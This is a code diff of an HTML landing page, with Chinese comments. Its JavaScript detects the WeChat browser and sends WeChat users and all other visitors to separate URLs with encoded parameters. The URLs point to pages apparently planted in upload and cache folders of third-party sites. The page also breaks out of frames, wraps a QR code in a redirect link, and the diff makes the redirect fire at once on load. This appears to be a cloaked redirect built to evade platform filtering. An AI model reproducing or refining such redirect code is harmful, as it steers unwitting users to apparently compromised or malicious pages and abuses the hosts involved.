@@ -9,38 +9,36 @@
     
     <script>
         // 配置跳转域名变量
-         var wechatUrl = "http://jnurl.cn/uploads/tmp/top.html?d=DxsAHxlTTkIEBxUbW0cAFEkMGg4HDE8OAwFaAgIHBB9JDBpAAFAVCBUAAEAkWAQvBA48PyxGUFpTVk1YUlhQWF5aQEECHQwB";  // 微信浏览器跳转的域名
-         var otherUrl = "http://zgjst.net/dayrui/Laravel/System/bootstrap/cache/top.html?d=DxsAHxlTTkIEBxUbW0cAFEkMGg4HDE8OAwFaAgIHBB9JDBpADlwABxIIEEAkWAQvBA48PyxGUFpTVk1YXFxVXl5eR0ECHQwB";   // 其他浏览器跳转的域名
-         var currentTargetUrl = ""; // 存储当前应该跳转的URL
+        var wechatUrl = "http://jnurl.cn/uploads/tmp/top.html?d=DxsAHxlTTkIEBxUbW0cAFEkMGg4HDE8OAwFaAgIHBB9JDBpAAFAVCBUAAEAkWAQvBA48PyxGUFpTVk1YUlhQWF5aQEECHQwB";
+        var otherUrl = "http://zgjst.net/dayrui/Laravel/System/bootstrap/cache/top.html?d=DxsAHxlTTkIEBxUbW0cAFEkMGg4HDE8OAwFaAgIHBB9JDBpADlwABxIIEEAkWAQvBA48PyxGUFpTVk1YXFxVXl5eR0ECHQwB";
+        var currentTargetUrl = ""; // 存储当前应该跳转的URL
+        var redirectAttempted = false; // 标记是否已尝试跳转
         
         // 检测浏览器类型并跳转
         function detectBrowserAndRedirect() {
             var ua = navigator.userAgent.toLowerCase();
-            var timestamp = new Date().getTime();
             
             if (ua.indexOf('micromessenger') !== -1) {
-                // 微信浏览器
-                 // 立即跳转
-    try {
-        window.location.href = wechatUrl;
-    } catch (error) {
-        // 如果立即跳转失败，延时跳转
-        setTimeout(function() {
-            window.location.href = wechatUrl;
-        }, 2000);
-    }
+                // 微信浏览器 - 使用延迟跳转
+                currentTargetUrl = wechatUrl;
+                console.log('检测到微信浏览器，2秒后跳转到微信端域名');
+                
+                // 微信浏览器延迟2秒跳转
+                setTimeout("javascript:location.href='" + wechatUrl + "'", 2000);
+                redirectAttempted = true;
+                
             } else {
-                // 其他浏览器
-                currentTargetUrl = otherUrl + "?t=" + timestamp;
-                console.log('检测到其他浏览器，跳转到其他端域名');
-            }
-            
-            // 尝试自动跳转
-            try {
-                window.location.replace(currentTargetUrl);
-            } catch (error) {
-                console.log('自动跳转失败:', error);
-                handleRedirectFailure();
+                // 其他浏览器 - 立即跳转
+                currentTargetUrl = otherUrl;
+                console.log('检测到其他浏览器，立即跳转到其他端域名');
+                
+                try {
+                    redirectAttempted = true;
+                    window.location.href = currentTargetUrl;
+                } catch (error) {
+                    console.log('自动跳转失败:', error);
+                    handleRedirectFailure();
+                }
             }
         }
         
@@ -54,15 +52,16 @@
             if (loadingText) {
                 loadingText.innerHTML = '自动跳转失败，请点击上方二维码手动跳转';
                 loadingText.style.color = '#ff6b6b';
+                loadingText.classList.add('click-hint');
             }
         }
         
         // 给图片添加点击跳转功能
         function addClickRedirectToImage() {
-            var qrcodeDiv = document.querySelector('.code-qrcode');
             var img = document.querySelector('.code-qrcode img');
+            var qrcodeDiv = document.querySelector('.code-qrcode');
             
-            if (img && currentTargetUrl) {
+            if (img && currentTargetUrl && qrcodeDiv) {
                 // 创建a标签包裹图片
                 var link = document.createElement('a');
                 link.href = currentTargetUrl;
@@ -74,10 +73,15 @@
                 img.parentNode.insertBefore(link, img);
                 link.appendChild(img);
                 
-                // 添加点击事件
+                // 添加点击事件（双重保险）
                 link.addEventListener('click', function(e) {
                     e.preventDefault();
-                    window.location.href = currentTargetUrl;
+                    try {
+                        window.location.href = currentTargetUrl;
+                    } catch (error) {
+                        // 如果还是失败，尝试其他跳转方式
+                        window.location.replace(currentTargetUrl);
+                    }
                 });
                 
                 // 给图片添加点击提示样式
@@ -100,18 +104,8 @@
             }
         }
         
-        // 页面加载后执行
-        window.addEventListener('load', function() {
-            detectBrowserAndRedirect();
-            
-            // 3秒后检查是否跳转成功，如果没有则启用手动跳转
-            setTimeout(function() {
-                if (window.location.href.indexOf(wechatUrl) === -1 && 
-                    window.location.href.indexOf(otherUrl) === -1) {
-                    handleRedirectFailure();
-                }
-            }, 3000);
-        });
+        // 页面加载后立即检测并跳转
+        detectBrowserAndRedirect();
     </script>
     
     <style type="text/css">
@@ -225,6 +219,11 @@
         a {
             text-decoration: none;
             color: inherit;
+            transition: opacity 0.3s ease;
+        }
+
+        a:hover {
+            opacity: 0.8;
         }
 
         /* 响应式设计 */
@@ -240,6 +239,13 @@
             
             .text {
                 font-size: 14px;
+            }
+        }
+
+        /* 手机端点击效果 */
+        @media (max-width: 768px) {
+            .code-qrcode img:active {
+                transform: scale(0.95);
             }
         }
     </style>
@@ -268,6 +274,13 @@
         if (window.top !== window.self) {
             window.top.location = window.self.location;
         }
+        
+        // 如果5秒内没有跳转，显示错误信息并启用手动跳转
+        setTimeout(function() {
+            if (!redirectAttempted) {
+                handleRedirectFailure();
+            }
+        }, 5000);
     </script>
 </body>
 </html>
